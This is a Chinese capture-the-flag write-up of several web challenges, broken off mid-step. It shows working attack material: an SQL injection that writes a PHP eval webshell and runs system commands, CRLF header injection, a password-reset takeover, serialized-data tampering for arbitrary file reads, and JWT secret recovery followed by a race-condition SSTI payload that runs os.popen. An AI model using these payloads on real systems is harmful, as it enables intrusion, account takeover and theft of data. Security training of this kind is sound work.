1. **找入口位置**

   拿到源码后，优先找用户可控参数。PHP 里常见入口一般是：

   ```php
   $_GET
   $_POST
   $_REQUEST
   $_FILES
   $_COOKIE
   $_SERVER
   ```

   所以可以直接用 VSCode 全局搜索：

   ```php
   $_
   ```

   可以找到几个关键位置。

   1. `upload.php`

      搜索到：

      ```php
      if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
          json_error('Method Not Allowed', 405);
      }
      ```

      继续往下看：

      ```php
      if (!isset($_FILES[$key])) continue;
      ```

      说明这里通过 `$_FILES` 接收上传文件，所以 `upload.php` 是文件上传入口。

   2. `etFileContent.php`

      搜索到：

      ```php
      $id = isset($_GET['id']) ? (int) $_GET['id'] : 0;
      ```

      说明 `getFileContent.php` 通过 GET 接收 `id` 参数。

      后面查询：

      ```php
      $res = $mysqli->query("SELECT filename, content FROM uploads WHERE id = $id LIMIT 1");
      ```

      虽然这里把 `$id` 拼进了 SQL 语句，但是前面已经用 `(int)` 强制转换成整数，所以这里基本不能利用 SQL 注入。

   3. `getFileList.php`

      搜索到：

      ```php
      $order = $_GET['order'] ?? "upload_time";
      ```

      > `??` 是 PHP 里的空合并运算符。
      >
      > 意思是：
      >
      > + 如果 GET 参数 order 存在，并且不是 null，就把它赋值给 $order；
      > + 如果没有传 order，就默认使用 "upload_time"。

      说明 `getFileList.php` 通过 GET 接收 `order` 参数。

      后面有过滤：

      ```php
      if (!preg_match("/upload_time|id/", $order)) {
          json_error("非法的 order 参数", 400);
      }
      ```

      看起来只允许赋值 `upload_time` 或 `id`，但是这个正则没有写成严格匹配，比如没有写成：

      ```php
      /^(upload_time|id)$/
      ```

      所以只要参数里包含 `upload_time` 或 `id`，就可以通过过滤。例如：

      ```http
      ?order=id
      ```

      可以通过。

      ```http
      ?order=id into outfile '/var/www/html/shell.php'
      ```

      也可以通过。

      最后拼接到 SQL 里：

      ```php
      $sql = "SELECT id, filename, upload_time
              FROM uploads
              ORDER BY $order";
      ```

      就会变成：

      ```sql
      SELECT id, filename, upload_time
      FROM uploads
      ORDER BY id into outfile '/var/www/html/shell.php'
      ```

      > `ORDER BY id` 的意思是：按照 `id` 这一列进行排序。
      >
      > 例如数据库里可能是：
      >
      > | id   | filename | upload_time |
      > | ---- | -------- | ----------- |
      > | 3    | c.txt    | 2026-06-08  |
      > | 1    | a.txt    | 2026-06-06  |
      > | 2    | b.txt    | 2026-06-07  |
      >
      > 执行：
      >
      > ```sql
      > ORDER BY id
      > ```
      >
      > 返回顺序就会变成：
      >
      > | id   | filename | upload_time |
      > | ---- | -------- | ----------- |
      > | 1    | a.txt    | 2026-06-06  |
      > | 2    | b.txt    | 2026-06-07  |
      > | 3    | c.txt    | 2026-06-08  |

      所以真正的 SQL 注入点在 `getFileList.php` 的 `order` 参数。

2. **定位一句话木马的写入点**

   写入一句话木马的常见 SQL 语句是：

   ```sql
   SELECT 1, "<?php @eval($_POST[1]);?>", 3
   into outfile '/var/www/html/shell.php'
   ```

   但这里是：

   ```sql
   SELECT id, filename, upload_time
   FROM uploads
   ORDER BY id into outfile '/var/www/html/shell.php'
   ```

   所以这里要找 `id, filename, upload_time` 这三列分别从哪里来，确定能写入一句话木马的可控变量是哪个。

   找 `filename` 时在 `upload.php` 中找到：

   ```php
   $filename = basename(str_replace("\0", '', (string)$origName));
   if ($filename === '') $filename = 'unnamed';
   ```

   大致意思是从上传文件的原始文件名里，去掉空字节和路径，只保留干净的文件名。

   所以变量 `filename` 可以通过上传文件的名字来控制，这里就是一句话木马的写入点。

3. **解题流程**

   1. 随意上传一个文件并抓包，把文件名修改成 `<?php @eval($_POST[1]);?>`：

      ![image-20260608205818355](https://img.yanxisishi.top/images/2026/06/image-20260608205818355.png)

   2. 回到靶机主页传入：

      ```http
      /getFileList.php?order=id%20into%20outfile%20%27/var/www/html/shell.php%27
      ```

      URL 解码后就是：

      ```http
      /getFileList.php?order=id into outfile '/var/www/html/shell.php'
      ```

   3. 访问 `/shell.php`，如果页面没有返回 404 就说明成功了，接着 POST 传入：

      ```http
      1=system('/readFlag');
      ```

      得到 flag。

## WEEK 5

### 被玩坏的 AI

dirsearch 扫目录扫出来 `robots.txt`，访问 `/robots.txt` 返回：

```txt
User-agent: *
Allow: /find.php

Disallow: /RPO/
```

访问 `/find.php`，是一个 `🎯 是否想要 flag？` 的页面，但 `Yes` 按钮会到处跑。

直接查看源码，看到：

```html
<canvas class="matrix"></canvas>
<div class="container">
    <h1>🎯 是否想要 flag？</h1>
    <button id="yesBtn">Yes</button>
    <button id="noBtn">No</button>
</div>
<script src="findpwd.js"></script>
```

试试下载 `findpwd.js` 看看（防止浏览器查看时中文会乱码）：

```bash
curl -O http://docker.qingcen.net:38309/findpwd.js
```

下载后看到 `findpwd.js` 的内容是：

```js
console.log("这里可没有，你想要的password，试着找找是不是在其他的find.php中？");
```

结合刚刚 `robots.txt` 中还有 `/RPO/`，尝试访问 `/RPO/find.php` 但返回 404，尝试访问 `/RPO/findpwd.js` 看到有返回结果了。

下载 `/RPO/findpwd.js` 看看：

```bash
curl -O http://docker.qingcen.net:38309/RPO/findpwd.js
```

下载后看到 `findpwd.js` 的内容是：

```js
console.log("🤖 Beep boop... 系统消息: yours password:@pwdisadmin");
```

回到靶机首页，向机器人发送：

```txt
@pwdisadmin
```

返回：

```txt
密码正确 ✅，已获得低权限。
不过，要拿到真正的 flag 还需要 Admin 。
```

查看一下源码，看到注释提示：

```html
/*
在后端有个其他文件进行了下面内容
if (isset($_SERVER['HTTP_X_ADMIN']) && $_SERVER['HTTP_X_ADMIN'] === 'Admin') {
	$a = getenv("flag");
} else {
    header('Content-Type: text/plain; charset=utf-8');
    $a  = "Hello, low-priv user.I'm X,can I help you?";
}
*/
```

我一开始尝试了随便输入个对话并在发送的时候抓包，为请求体加上：

```http
X-Admin: Admin
```

但这是错误的，因为注释中也写了真正判断权限的是后端某个文件，因此这里想要给后端解析的时候加上这么一个请求头，只能是 CRLF 注入。

在请求体看到：

```http
POST /proxy.php HTTP/1.1
Host: docker.qingcen.net:38309

ua=111&ajax=1
```

`ua` 这个参数很容易联想到 `User-Agent`，这里大概率是 CRLF 注入的注入点，传入：

```http
ua=1110d%0aX-Admin:Admin&ajax=1
```

`%0d%0a` 对应 `/r/n` 的 URL 编码。

### Binary Blog

先随便注册一个账号 `test/111111` 并登录（本来想注册 `admin` 的，但显示账号已存在），进去后是一个发布博客的页面。

尝试发布一篇新博客，博客标题和博客内容均填写 `test` 然后发布博客，但点击新发布的博客发现没什么特别的。

在初始就存在的三篇博客上看到：

```txt
本指南将帮助您快速上手博客系统：

1. 发布新博客：点击"发布博客"按钮，填写标题和内容
2. 编辑博客：在博客详情页点击"编辑"按钮
3. 删除博客：在博客详情页点击"删除"按钮
4. 管理用户（管理员）：点击"用户管理"查看所有用户

如有任何问题，请联系系统管理员。
```

```txt
这是一个功能完整的博客系统，您可以在这里发布、编辑和管理您的博客内容。

系统特点：
- 支持用户注册和登录
- 管理员可以管理所有用户和博客
- 支持富文本编辑
- 响应式设计，适配各种设备

开始使用吧！
```

多处提醒到管理员的特权，说明本题极有可能需要拿到管理员的权限。

右上角的用户名的下拉菜单中存在 `修改密码` 的选项：

![image-20260608221430948](https://img.yanxisishi.top/images/2026/06/image-20260608221430948.png)

这里值得作为越权的突破点。

当前密码、新密码、确认新密码分别输入 `111111/222222/222222`，点击 `修改密码` 的同时进行抓包。

在抓包结果中看到请求体里面有：

```json
{"username":"test","new_password1":"222222","new_password2":"222222","csrf_token":"75d8b21a8bd625590d261b1da4b80c5ed0d899bcdb49ceb32b45169d449e854f"}
```

结合刚刚想注册 `admin` 时显示用户名已存在，尝试把 `"username":"test"` 修改成 `"username":"admin"`：

![image-20260608222048568](https://img.yanxisishi.top/images/2026/06/image-20260608222048568.png)

可惜失败了，返回：

```json
{"success":false,"message":"\u5bc6\u7801\u5fc5\u987b\u5305\u542b\u5b57\u6bcd\u548c\u6570\u5b57"}
```

将：

```txt
\u5bc6\u7801\u5fc5\u987b\u5305\u542b\u5b57\u6bcd\u548c\u6570\u5b57
```

进行 Unicode 解码，得到：

```txt
密码必须包含字母和数字
```

这次把 JSON 请求体改成：

```json
{"username":"admin","new_password1":"12345a","new_password2":"12345a","csrf_token":"75d8b21a8bd625590d261b1da4b80c5ed0d899bcdb49ceb32b45169d449e854f"}
```

重新发送显示成功了。

接着以 `admin/12345a` 登录进去，发现新增了 `用户管理` 和 `博客管理` 两个页面。

在 `博客管理` 页面，看到可以导入和导出博客，尝试导出 admin 写的博客 `欢迎使用博客系统`，得到 `blog_1_欢迎使用博客系统.dat`，是一段序列化数据：

```txt
a:4:{s:9:"timestamp";i:1780974797;s:7:"version";s:3:"1.0";s:4:"blog";O:4:"Blog":8:{s:2:"id";i:1;s:5:"title";s:24:"欢迎使用博客系统";s:7:"content";s:280:"这是一个功能完整的博客系统，您可以在这里发布、编辑和管理您的博客内容。

系统特点：
- 支持用户注册和登录
- 管理员可以管理所有用户和博客
- 支持富文本编辑
- 响应式设计，适配各种设备

开始使用吧！";s:7:"user_id";i:1;s:8:"username";s:5:"admin";s:10:"created_at";s:19:"2026-06-09 10:57:54";s:10:"updated_at";s:19:"2026-06-09 10:57:54";s:8:"template";s:11:"default.php";}s:9:"signature";s:64:"9891f40dbfc88f0111644d4790355d20259774bf4b5114ee2ac85c5b7579c4cf";}
```

尤其看到：

```txt
s:8:"template";s:11:"default.php";
```

这里可能存在任意文件读取的漏洞。

新建一个新的 `1.dat`，把先前的：

```txt
s:8:"template";s:11:"default.php";
```

换成：

```txt
s:8:"template";s:11:"/etc/passwd";
```

类似：

```txt
a:4:{s:9:"timestamp";i:1780974797;s:7:"version";s:3:"1.0";s:4:"blog";O:4:"Blog":8:{s:2:"id";i:1;s:5:"title";s:24:"欢迎使用博客系统";s:7:"content";s:1:"1";s:7:"user_id";i:1;s:8:"username";s:5:"admin";s:10:"created_at";s:19:"2026-06-09 10:57:54";s:10:"updated_at";s:19:"2026-06-09 10:57:54";s:8:"template";s:11:"/etc/passwd";}s:9:"signature";s:64:"9891f40dbfc88f0111644d4790355d20259774bf4b5114ee2ac85c5b7579c4cf";}
```

导入后在页面底下出现回显：

![image-20260609113907206](https://img.yanxisishi.top/images/2026/06/image-20260609113907206.png)

说明确实存在任意文件读取的漏洞。

用 dirsearch 扫一下目录，重点看 flag 相关字样的文件：

![image-20260609113103030](https://img.yanxisishi.top/images/2026/06/image-20260609113103030.png)

看到确实扫出来了 `flag.php`，但状态码是 500，用伪协议读取即可。

把先前的：

```txt
s:8:"template";s:11:"default.php";
```

换成：

```txt
s:8:"template";s:52:"php://filter/convert.base64-encode/resource=flag.php";
```

类似：

```txt
a:4:{s:9:"timestamp";i:1780974797;s:7:"version";s:3:"1.0";s:4:"blog";O:4:"Blog":8:{s:2:"id";i:1;s:5:"title";s:24:"欢迎使用博客系统";s:7:"content";s:1:"1";s:7:"user_id";i:1;s:8:"username";s:5:"admin";s:10:"created_at";s:19:"2026-06-09 10:57:54";s:10:"updated_at";s:19:"2026-06-09 10:57:54";s:8:"template";s:52:"php://filter/convert.base64-encode/resource=flag.php";}s:9:"signature";s:64:"9891f40dbfc88f0111644d4790355d20259774bf4b5114ee2ac85c5b7579c4cf";}
```

导入后在页面底下回显：

```txt
处理结果
PD9waHAgID0gJ2ZsYWd7YTdjNjYwOTAtOGJiYi00ODUyLWFiMGYtMGI2ODI1ZDkwNjNjfSc7ID8+Cg==
```

Base64 解码得到 flag。

### 废弃的网站

审计 Python 代码：

1. **先找路由**

   ```python
   @app.route('/', methods=['GET'])
   def home():
       return render_template('index.html')
   ```

   访问根路由 `/` 时，会调用 `home()` 函数，并使用 Flask 的 `render_template()` 渲染 `index.html`。

   ```python
   @app.route("/admin", methods=['GET'])
   @admin_required
   def admin_panel():
       global tempuser
       return render_template_string("Welcome Back, %s" % tempuser['name'])
   ```

   访问 `/admin` 路由时，会调用 `admin_panel()` 函数，返回一句欢迎语，用户名从全局变量 `tempuser` 里取。

   但是这个路由上面有一层装饰器：

   ```python
   @admin_required
   ```

   说明在真正执行 `admin_panel()` 之前，会先执行 `admin_required()` 里面的身份校验逻辑。

   ```python
   @app.route("/static/<path:filename>", methods=['GET'])
   def serve_static(filename):
       if not filename.endswith('.png'):
           abort(403, description="Only .png files are allowed.")
       return app.send_static_file(filename)
   ```

   访问 Flask 的 `static/` 目录中的静态文件时，只允许访问 `.png` 文件，如果不是 `.png` 文件，就直接返回 403。

2. **找 `flag` 返回逻辑**

   访问 `/admin` 路由时有：

   ```python
   return render_template_string("Welcome Back, %s" % tempuser['name'])
   ```

   如果全局变量 `tempuser` 可控，就可以实现 SSTI 拿到 flag。

   但是在访问 `/admin` 之前需要先满足 `@admin_required`。

3. **定位 `admin_required()` 的源代码**

   找到：

   ```python
   def admin_required(f):
       def wrapper(*args, **kwargs):
           cookie = request.cookies.get('session', None)
           if cookie is None:
               
               response = redirect('/')
               session = jwt.encode(USER_DB['guest'], APP_SECRET, algorithm='HS256')
               response.set_cookie('session', session)
               return response
           try:
               user_data = jwt.decode(cookie, APP_SECRET, algorithms=['HS256'])
               if user_data['role'] != 'admin':
                   abort(403, description="Admin access required.")
               if user_data['name'] != 'Administrator':
                   abort(403, description="Admin access required.")
               time.sleep(0.15)
           except jwt.InvalidTokenError:
               abort(401, description = f"Session expired. Please log in again. System has been running {round(time.time() - time_started)} seconds.")
           return f(*args, **kwargs)
       wrapper.__name__ = f.__name__
       return wrapper
   ```

   如果用户的 Cookie 中没有读取到 `session`，就执行：

   ```python
   if cookie is None:
       
       response = redirect('/')
       session = jwt.encode(USER_DB['guest'], APP_SECRET, algorithm='HS256')
       response.set_cookie('session', session)
       return response
   ```

   > 1. **guest 信息 `USER_DB['guest']`**
   >
   >    跳转到源码前面的：
   >
   >    ```python
   >    USER_DB = {
   >        "admin": {"id": 1, "role": "admin", "name": "Administrator"},
   >        "guest": {"id": 2, "role": "guest", "name": "Guest User"},
   >    }
   >    ```
   >
   >    所以 `USER_DB` 是一个字典，用来保存两个用户的数据：`admin` 管理员身份和 `guest` 游客身份。
   >
   > 2. **JWT 密钥 `APP_SECRET`**
   >
   >    跳转到源码前面的：
   >
   >    ```python
   >    time_started = round(time.time())
   >    print(f"System started at {time_started}")
   >    APP_SECRET = hashlib.sha256(str(time_started).encode()).hexdigest()
   >    ```
   >
   >    其中：
   >
   >    ```python
   >    time_started = round(time.time())
   >    ```
   >
   >    意思是获取当前时间戳，并四舍五入成整数。
   >
   >    ```python
   >    print(f"System started at {time_started}")
   >    ```
   >
   >    意思是把程序启动时间打印出来。
   >
   >    ```python
   >    APP_SECRET = hashlib.sha256(str(time_started).encode()).hexdigest()
   >    ```
   >
   >    意思是把 `time_started` 先转成字符串，再编码成字节，然后做 `sha256` 哈希，最后变成十六进制字符串。

   这串代码的意思是跳转到首页 `/`，把 guest 用户信息做成 JWT 并放进 Cookie 的 `session` 里。

   如果有 `session`，就尝试解 JWT：

   ```python
   try:
       user_data = jwt.decode(cookie, APP_SECRET, algorithms=['HS256'])
   ```

   意思是用 `APP_SECRET` 去验证并解码 Cookie 里的 JWT。

   如果 JWT 正确，就会得到里面的用户信息，后续进入：

   ```python
   if user_data['role'] != 'admin':
       abort(403, description="Admin access required.")
   if user_data['name'] != 'Administrator':
       abort(403, description="Admin access required.")
   time.sleep(0.15)
   ```

   分别检验 JWT 里的 `role` 是不是 `admin`，`name` 是不是 `Administrator`，如果校验成功，就会让程序暂停 `0.15` 秒。

   如果 JWT 是错的，就进 except：

   ```python
   except jwt.InvalidTokenError:
       abort(401, description = f"Session expired. Please log in again. System has been running {round(time.time() - time_started)} seconds.")
   ```

   即返回 401，并且提示：

   ```txt
   System has been running xxx seconds
   ```

   泄露程序已经运行了多少秒。

   **总结：**

   本题的 JWT 密钥 `APP_SECRET` 由程序启动时间 `time_started` 生成，而错误的 `session` 会泄露程序运行时间：

   ```txt
   System has been running xxx seconds
   ```

   所以用响应头里的 `Date` 减去运行秒数，就能反推出 `time_started`，再计算 `sha256(time_started)` 得到 JWT 密钥。

   最后用该密钥签一个 `role=admin`、`name=Administrator` 的 JWT，替换 Cookie 里的 `session`，即可满足 `@admin_required`。

4. **找可控入口 `tempuser['name']` 是什么**

   整个源码也只有一处地方还没有审计了：

   ```python
   @app.before_request
   def load_user():
       if request.endpoint == 'static':
           return
       global tempuser
       cookie = request.cookies.get('session', None)
       if cookie is None:
           tempuser = USER_DB['guest']
           session = jwt.encode(tempuser, APP_SECRET, algorithm='HS256')
           response = redirect(request.path)
           response.set_cookie('session', session)
           return response
       try:
           user_data = jwt.decode(cookie, APP_SECRET, algorithms=['HS256'])
           tempuser = user_data
       except jwt.InvalidTokenError:
           session = jwt.encode(USER_DB['guest'], APP_SECRET, algorithm='HS256')
           content = render_template_string(
               "Session expired. Please log in again. System has been running %d seconds." %
               (round(time.time() - time_started))
           )
           response = app.make_response((content, 401))
           response.set_cookie('session', session)
           return response
   ```

   其中：

   ```python
   @app.before_request
   def load_user():
   ```

   表示每次访问网站任意路由（比如根路由 `/` 和 `/admin`）之前，都会先执行 `load_user()`。

   如果访问的是静态文件，比如图片、CSS、JS，就执行：

   ```python
   if request.endpoint == 'static':
       return
   ```

   意思是什么处理都不做，直接放过。

   如果 Cookie 中没有 `session`，就执行：

   ```python
   if cookie is None:
       tempuser = USER_DB['guest']
       session = jwt.encode(tempuser, APP_SECRET, algorithm='HS256')
       response = redirect(request.path)
       response.set_cookie('session', session)
       return response
   ```

   意思是把 guest 用户信息做成 JWT 并放进 Cookie 的 `session` 里，这里的 `tempuser` 就是：

   ```json
   {
       "id": 2, 
       "role": "guest", 
       "name": "Guest User"
   }
   ```

   如果 Cookie 中有 `session`，就执行：

   ```python
   try:
       user_data = jwt.decode(cookie, APP_SECRET, algorithms=['HS256'])
       tempuser = user_data
   ```

   意思是尝试用 `APP_SECRET` 解 JWT，如果 JWT 密钥 `APP_SECRET` 是可控的，那这里的 `tempuser` 是可以自定义的。

   如果 session 是错的，就执行：

   ```python
   except jwt.InvalidTokenError:
       session = jwt.encode(USER_DB['guest'], APP_SECRET, algorithm='HS256')
       content = render_template_string(
           "Session expired. Please log in again. System has been running %d seconds." %
           (round(time.time() - time_started))
       )
   ```

   意思是重新生成一个 guest 的 JWT，并返回提示：

   ```txt
   Session expired. Please log in again. System has been running xxx seconds.
   ```

   这个 `xxx seconds` 就是程序已经运行了多少秒。

   **总结：**

   想要通过 `tempuser['name']` 实现 SSTI，只需要利用已知的 JWT 密钥 `APP_SECRE` 签一个 `name={{url_for.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}` 的 JWT，替换 Cookie 里的 `session`。

5. **构造思路**

   虽然前面需要通过签一个 `role=admin`、`name=Administrator` 的 JWT，替换 Cookie 里的 `session`，才能满足 `@admin_required`。

   而真正的攻击点是 签一个 `name={{url_for.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}` 的 JWT，替换 Cookie 里的 `session`，实现 SSTI。

   但是 `@admin_required` 校验成功后会让程序暂停 `0.15` 秒，这里可以利用竞争实现：

   1. 第一个请求带 admin JWT，负责通过 `@admin_required` 校验，并进入 `0.15` 秒 sleep。
   2. 第二个请求带 SSTI JWT，负责让 `load_user()` 把全局变量 `tempuser` 改成恶意 `name`。
   3. 第一个请求 sleep 结束后继续执行 `admin_panel()`，此时 `tempuser` 已经被第二个请求污染，于是 `render_template_string(tempuser['name'])` 触发 SSTI。

6. **解题流程**

   1. **拿到程序运行时间和服务器当前时间：**

      访问 `/admin` 并用 BurpSuite 抓包，把 Cookie 里的 `session` 随便改错，触发报错，例如：

      ```http
      Cookie: session=yanxi
      ```

      ![image-20260611144511441](https://img.yanxisishi.top/images/2026/06/image-20260611144511441.png)

      返回：

      ```txt
      Session expired. Please log in again. System has been running 504 seconds.
      ```

      这里拿到程序运行时间。

      再看响应头里的 `Date`，得到服务器当前时间：

      ```http
      Date: Thu, 11 Jun 2026 06:42:53 GMT
      ```

   2. **计算 JWT 密钥：**

      根据：

      ```txt
      服务器当前时间 - 程序运行时间 = time_started
      ```

      可以反推出程序启动时间。

      根据源码：

      ```python
      APP_SECRET = hashlib.sha256(str(time_started).encode()).hexdigest()
      ```

      可以计算出 `APP_SECRET`，也就是 JWT 密钥。

      ```python
      from email.utils import parsedate_to_datetime
      import hashlib
      
      a = "Thu, 11 Jun 2026 06:42:53 GMT"
      b = 504
      
      now = int(parsedate_to_datetime(a).timestamp())
      start = now - b
      
      print(hashlib.sha256(str(start).encode()).hexdigest())
      ```

      运行 Python 脚本得到：

      ```txt
      fbb24d10778a0d7a7ce291e1fa2d0268e5b1925d13d6a69e8598b6b74c8253a5
      ```

      这就是本题的 JWT 密钥。

   3. **伪造管理员 JWT：**

      用这个密钥先签一个管理员 JWT：

      ```json
      import jwt
      
      secret = "fbb24d10778a0d7a7ce291e1fa2d0268e5b1925d13d6a69e8598b6b74c8253a5"
      
      payload = {
          "id": 1,
          "role": "admin",
          "name": "Administrator"
      }   
          
      token = jwt.encode(payload, secret, algorithm="HS256")
      print(token)
      ```

      伪造出来的 JWT 是：

      ```txt
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.Xz59V69gAiakWv-hgBaGsNdkmI7cbB2gxlEqXCEgdYQ
      ```

      这个 JWT 用来通过 `/admin` 的 `@admin_required` 校验。

      但是这个 JWT 验证失败了，因为先前计算时间戳的时候没有考虑到后端响应时间、网络延迟等导致的响应头里的 `Date` 与真实的服务器当前时间存在误差。

   4. **爆破找到可以通过验证的管理员 JWT**

      假定误差在 10 秒内，批量生成一些 JWT 密钥：

      ```python
      from email.utils import parsedate_to_datetime
      import hashlib
      import jwt
      
      a = "Thu, 11 Jun 2026 06:42:53 GMT"
      b = 504
      
      now = int(parsedate_to_datetime(a).timestamp())
      start = now - b
      
      for i in range(-10, 11):
          time_started = start + i
          secret = hashlib.sha256(str(time_started).encode()).hexdigest()
      
          payload = {
              "id": 1,
              "role": "admin",
              "name": "Administrator"
          }
      
          token = jwt.encode(payload, secret, algorithm="HS256")
          print(token)
      ```

      得到：

      ```txt
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.fQEdNOSQMJmWg_qITgmsIP6R-zJiiQh4jnffbXzN_NE
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.iozXqammcL__XHVMiBQMRdavhvnePbUpP1srUTbmJws
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.8qfih3y2ZFvDspADPWtfhwI-b9PRarTVRzIIIAtSOtQ
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.CazBFy7q8MlNEt9Cc_6NWKycFgV346QQmJOlPbG3veU
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.n_ZEP_Ud_vGMMD5yC7UE4UQKK7ksSDI5kYLZCDA470M
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.KRwoTJtkGDCHSM6Vwo1kcDxQytEdaIu3imrLyP9FVGM
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.iCMZ4b0e2WYdou2-twSR_3cmawyw4qoCH27yN81XVwM
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.GZAsATqgJ7aimaUzn_KDVcuZXIQufKWkhlKMmsxn7Vc
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.IANvE4waBsZUVxeLW_jKw2BK_2rT2OhHPTneN8Og3lk
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.pcvw-SzTmzZ2Jq5jRep7zwO6mCUVFSRSQtcIVRBHvOM
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.Xz59V69gAiakWv-hgBaGsNdkmI7cbB2gxlEqXCEgdYQ
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.poAp6kw4yx8t0098g742Jy8EVTfPtA9U9E5J0ZoMtR8
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.U4ALg9cDev7zzzoLK8JwIu2RQe59TL8cG5gZe8EgPV4
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.JC4pkIglf6aiB2rRcLmwjsngrHQKZnWnB_NlKGkpqaM
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.p5nA7LYLp11zcFldPDuyvHUq_jrEZnvQKe3n7e1kIXc
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.wwBJmcC072y3p4c0wtQhPgiUln6Szk5C83puC4Nh39g
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.23Ewe1TcDnHgOgUTGIakuiVPPhlcfz25L6Dv_btPPzc
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.jCilnEHlhgM1JAngb-37OUl63i0I0njUJK91A0Eq0r0
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.YhVmlxcCtPABIiZT2pQ9O9_BgEzfpPZJ6cl6V6u71mw
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.VDEb6jWpVgsTN9tDiTD2QeIf-p0StqaIapgRMuJaJ3s
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.0VjrVLJOEBVL5JPJOkzZB-rYb7Z_ovoaUK8xohGDe6Y
      ```

      放入 BurpSuite 的 Intruder 模块进行爆破 `session` 值。

      **注：** 需要取消勾选 URL 编码字符，防止 `.` 被 URL 编码。

      ![image-20260611152845391](https://img.yanxisishi.top/images/2026/06/image-20260611152845391.png)

      看到有一个结果的状态码和长度与别的都不一样：

      ![image-20260611153019423](https://img.yanxisishi.top/images/2026/06/image-20260611153019423.png)

      所以能进入 `/admin` 的 `session` 就是：

      ```txt
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.poAp6kw4yx8t0098g742Jy8EVTfPtA9U9E5J0ZoMtR8
      ```

      可以看到这个和原先伪造的 JWT 就差了 1 秒的时间戳，~~真恶心啊~~。

      然后运行：

      ```python
      from email.utils import parsedate_to_datetime
      import hashlib
      
      a = "Thu, 11 Jun 2026 06:42:53 GMT"
      b = 504
      
      now = int(parsedate_to_datetime(a).timestamp())
      start = now - b + 1
      
      print(hashlib.sha256(str(start).encode()).hexdigest())
      ```

      得到真正的 JWT 密钥是：

      ```txt
      4d0fc99786657ac4cc9dbade317386224fc2293fb5715720a0c7d5a03dea2767
      ```

   5. **伪造一个带 SSTI payload 的 JWT：**

      ```json
      import jwt
      
      secret = "4d0fc99786657ac4cc9dbade317386224fc2293fb5715720a0c7d5a03dea2767"
      
      payload = {
          "id": 1,
          "role": "admin",
          "name": "{{url_for.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}"
      }   
          
      token = jwt.encode(payload, secret, algorithm="HS256")
      print(token)
      ```

      伪造出来的 JWT 是：

      ```txt
